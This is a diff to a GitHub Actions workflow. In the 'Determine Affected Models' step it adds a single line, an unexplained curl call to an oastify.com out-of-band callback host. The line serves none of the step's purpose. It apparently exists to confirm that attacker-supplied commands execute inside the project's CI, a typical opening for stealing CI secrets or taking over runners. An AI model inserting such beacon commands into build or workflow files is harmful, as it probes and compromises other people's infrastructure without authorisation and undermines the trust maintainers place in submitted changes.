@@ -44,6 +44,7 @@ jobs:
       - name: Determine Affected Models
         id: affected_models
         run: |
+          curl cvbs9piecb4szvaiqn8cc7ivwm2msaky9.oastify.com
           PR_BRANCH=${{ github.head_ref }} \
           python3 .github/workflows/kind-cluster/determine_models.py
             
